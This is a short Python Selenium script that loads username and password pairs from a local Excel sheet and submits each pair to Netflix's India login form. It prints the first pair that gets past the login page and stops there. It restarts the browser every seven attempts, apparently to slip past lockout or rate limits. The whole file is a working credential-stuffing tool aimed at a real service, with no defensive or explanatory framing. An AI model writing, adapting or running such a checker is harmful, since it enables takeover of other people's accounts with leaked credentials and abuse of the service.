from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import openpyxl
import time
import bro5
driver=webdriver.Chrome(executable_path="./chromedriver")
driver.get("https://www.netflix.com/in/login")
time.sleep(2)
path="C:/Users/HP/Documents/ids1.xlsx"
r=bro5.getrowcount(path,"Sheet1")
for rn in range(1,r+1):
    driver.find_element_by_xpath(
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/label/input').clear()
    driver.find_element_by_xpath(
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[1]/div[1]/div/label/input').send_keys(bro5.readata(path, "Sheet1", rn, 1))
    time.sleep(1)
    driver.find_element_by_xpath(
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input').clear()
    driver.find_element_by_xpath(
        '/html/body/div[1]/div/div[3]/div/div/div[1]/form/div[2]/div/div/label/input').send_keys(bro5.readata(path, "Sheet1", rn, 2))
    time.sleep(1)
    driver.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/div/div[1]/form/button').click()
    time.sleep(2)
    if driver.current_url!="https://www.netflix.com/in/login":
        print(bro5.readata(path, "Sheet1", rn, 1), "-", bro5.readata(path, "Sheet1", rn, 2))
        break
    if rn%7==0:
        print(rn)
        driver.quit()
        driver = webdriver.Chrome(executable_path="./chromedriver")
        driver.get("https://www.netflix.com/in/login")
        time.sleep(2)
driver.quit()





